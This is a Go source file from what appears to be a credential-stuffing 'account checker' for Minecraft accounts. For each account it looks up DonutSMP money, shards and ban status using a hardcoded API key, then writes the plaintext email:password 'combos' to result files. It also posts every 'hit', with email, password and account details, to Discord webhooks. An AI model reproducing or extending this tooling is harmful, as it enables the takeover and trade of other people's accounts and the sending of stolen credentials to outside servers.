package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

const donutAPIKey = "1a5487cf06ef44c982dfb92c3a8ba0eb"

var ResultDir string

func EnsureResultDir(name string) {
	ResultDir = "results/" + name
	_ = os.MkdirAll(ResultDir, 0755)
}

func AppendResult(filename, line string) {
	if ResultDir == "" {
		return
	}
	path := ResultDir + "/" + filename
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line + "\n")
}

// ── Donut SMP check (HTTP API, same method as bot.py) ────────────────────────

func CheckDonut(r *AuthResult) {
	if r.Username == "" || r.Username == "N/A" {
		return
	}

	client := &http.Client{Timeout: 10 * time.Second}
	authHeader := "Bearer " + donutAPIKey

	// Get stats (money, shards)
	if body, err := donutGET(client, "https://api.donutsmp.net/v1/stats/"+r.Username, authHeader); err == nil {
		var data map[string]interface{}
		if json.Unmarshal(body, &data) == nil {
			if status, ok := data["status"].(float64); ok && status == 200 {
				if result, ok := data["result"].(map[string]interface{}); ok {
					if money, ok := result["money"]; ok {
						r.DonutMoney = toString(money)
					}
					if shards, ok := result["shards"]; ok {
						r.DonutShards = toString(shards)
					}
				}
			}
		}
	}

	// Ban lookup: 500 = banned, 200 = unbanned (exactly as bot.py does it)
	status, err := donutGETStatus(client, "https://api.donutsmp.net/v1/lookup/"+r.Username, authHeader)
	if err == nil {
		switch status {
		case 500:
			r.DonutStatus = "banned"
			incDonutB()
			AppendResult("DonutBanned.txt", r.Email+":"+r.Password)
		case 200:
			r.DonutStatus = "unbanned"
			incDonutUB()
			AppendResult("DonutUnbanned.txt", r.Email+":"+r.Password)
		default:
			r.DonutStatus = "unknown"
		}
	} else {
		r.DonutStatus = "unknown"
	}
}

func donutGET(client *http.Client, rawURL, authHeader string) ([]byte, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Authorization", authHeader)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func donutGETStatus(client *http.Client, rawURL, authHeader string) (int, error) {
	req, err := http.NewRequest("GET", rawURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Authorization", authHeader)
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	resp.Body.Close()
	return resp.StatusCode, nil
}

func toString(v interface{}) string {
	if v == nil {
		return ""
	}
	switch val := v.(type) {
	case string:
		return val
	case float64:
		// Format as int if it's a whole number
		if val == float64(int64(val)) {
			return formatInt(int64(val))
		}
		return formatFloat(val)
	default:
		return ""
	}
}

func formatInt(n int64) string {
	s := []byte{}
	neg := n < 0
	if neg {
		n = -n
	}
	for n > 0 {
		s = append([]byte{byte('0' + n%10)}, s...)
		n /= 10
	}
	if len(s) == 0 {
		s = []byte("0")
	}
	if neg {
		s = append([]byte{'-'}, s...)
	}
	return string(s)
}

func formatFloat(f float64) string {
	b, _ := json.Marshal(f)
	return string(b)
}

// ── Discord webhook for hit notifications ────────────────────────────────────

type discordEmbed struct {
	Color     int          `json:"color"`
	Fields    []embedField `json:"fields"`
	Author    *embedAuthor `json:"author,omitempty"`
	Thumbnail *embedImage  `json:"thumbnail,omitempty"`
	Footer    *embedFooter `json:"footer,omitempty"`
	Timestamp string       `json:"timestamp,omitempty"`
}

type embedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

type embedAuthor struct {
	Name    string `json:"name"`
	IconURL string `json:"icon_url,omitempty"`
}

type embedImage struct {
	URL string `json:"url"`
}

type embedFooter struct {
	Text string `json:"text"`
}

type discordWebhook struct {
	Username  string         `json:"username"`
	AvatarURL string         `json:"avatar_url"`
	Embeds    []discordEmbed `json:"embeds"`
}

func sendHitWebhook(cfg *Config, r *AuthResult) {
	if cfg.WebhookHits == "" {
		return
	}

	// Color: red = banned (donut or hypixel), green = unbanned, yellow = everything else
	color := 0xFFFF00
	isBanned := r.DonutStatus == "banned" || (r.HypixelBan != "" && r.HypixelBan != "Unbanned" && !strings.HasPrefix(r.HypixelBan, "[Error]"))
	isUnbanned := r.DonutStatus == "unbanned" || r.HypixelBan == "Unbanned"

	if isBanned {
		color = 0xFF0000
		if cfg.WebhookBanned != "" {
			postWebhook(cfg.WebhookBanned, buildEmbed(cfg, r, color))
			return
		}
	} else if isUnbanned {
		color = 0x00FF00
		if cfg.WebhookUnbanned != "" {
			postWebhook(cfg.WebhookUnbanned, buildEmbed(cfg, r, color))
			return
		}
	}

	postWebhook(cfg.WebhookHits, buildEmbed(cfg, r, color))
}

func buildEmbed(cfg *Config, r *AuthResult, color int) discordWebhook {
	username := r.Username
	if username == "" {
		username = "No MC Profile"
	}

	thumbnailURL := "https://mc-heads.net/body/steve"
	if r.Username != "" && r.Username != "N/A" {
		thumbnailURL = "https://mc-heads.net/body/" + r.Username
	}

	fields := []embedField{
		{Name: "<a:mail:1433704383685726248> Eᴍᴀɪʟ", Value: "||`" + r.Email + "`||", Inline: true},
		{Name: "<a:password:1433704402383802389> Pᴀѕѕᴡᴏʀᴅ", Value: "||`" + r.Password + "`||", Inline: true},
		{Name: "<:nametag:1439193947472924783> Uѕᴇʀɴᴀᴍᴇ", Value: username, Inline: true},
		{Name: "<a:account:1439194211856683009> Tʏᴘᴇ", Value: orNA(r.AccType), Inline: true},
	}

	// Hypixel ban status
	if r.HypixelBan != "" {
		hypixelEmoji := "<:unban:1439876861256794246>"
		if r.HypixelBan != "Unbanned" {
			hypixelEmoji = "<a:banned:1439876796655996988>"
		}
		fields = append(fields, embedField{Name: hypixelEmoji + " Hʏᴘɪxᴇʟ", Value: r.HypixelBan, Inline: true})
	}

	// DonutSMP
	if r.DonutStatus != "" && r.DonutStatus != "unknown" {
		donutEmoji := "<:unban:1439876861256794246>"
		donutLabel := "Unbanned"
		if r.DonutStatus == "banned" {
			donutEmoji = "<a:banned:1439876796655996988>"
			donutLabel = "Banned"
		}
		fields = append(fields, embedField{Name: "<:DonutSMP:1430813212395442217> DᴏɴᴜᴛSᴍᴘ", Value: donutEmoji + " " + donutLabel, Inline: true})
		if r.DonutMoney != "" {
			fields = append(fields, embedField{Name: "<:DonutSMP:1430813212395442217> Mᴏɴᴇʏ", Value: r.DonutMoney, Inline: true})
		}
		if r.DonutShards != "" {
			fields = append(fields, embedField{Name: "<:DonutSMP:1430813212395442217> Sʜᴀʀᴅѕ", Value: r.DonutShards, Inline: true})
		}
	}

	// Capes
	if r.Capes != "" {
		fields = append(fields, embedField{Name: "<a:capes:1433705405124706415> MC Cᴀᴘᴇѕ", Value: r.Capes, Inline: true})
	}

	// Combo — always last, not inline
	fields = append(fields, embedField{
		Name:   "<a:file:1439876698740097065> Cᴏᴍʙᴏ",
		Value:  "||```" + r.Email + ":" + r.Password + "```||",
		Inline: false,
	})

	return discordWebhook{
		Username:  "[AML] Checker",
		AvatarURL: "",
		Embeds: []discordEmbed{{
			Color:  color,
			Fields: fields,
			Author: &embedAuthor{Name: "[AML] Checker"},
			Thumbnail: &embedImage{URL: thumbnailURL},
			Footer:    &embedFooter{Text: "[AML] Checker | MSMC Engine"},
			Timestamp: time.Now().UTC().Format(time.RFC3339),
		}},
	}
}

func postWebhook(webhookURL string, payload discordWebhook) {
	body, err := json.Marshal(payload)
	if err != nil {
		return
	}
	resp, err := http.Post(webhookURL, "application/json", bytes.NewReader(body))
	if err != nil {
		return
	}
	resp.Body.Close()
}

func orNA(s string) string {
	if s == "" {
		return "N/A"
	}
	return s
}
